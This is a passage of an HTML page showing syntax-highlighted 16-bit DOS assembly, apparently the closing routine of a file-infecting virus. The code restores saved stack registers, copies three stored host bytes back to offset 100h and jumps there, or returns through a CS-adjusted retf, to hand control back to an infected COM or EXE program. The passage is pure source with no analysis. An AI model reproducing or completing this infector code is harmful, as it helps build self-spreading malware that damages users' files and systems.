       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; sp</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; ss</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
       </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">RETENER</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_</span><span class="sc0">
</span><span class="sc5">old_commands</span><span class="sc0">   </span><span class="sc9">dB</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc5">GO_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0E8H</span><span class="sc0">
         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0000H</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">@0001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@0001</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; sp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">zad</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
</span></div></body>
</html>
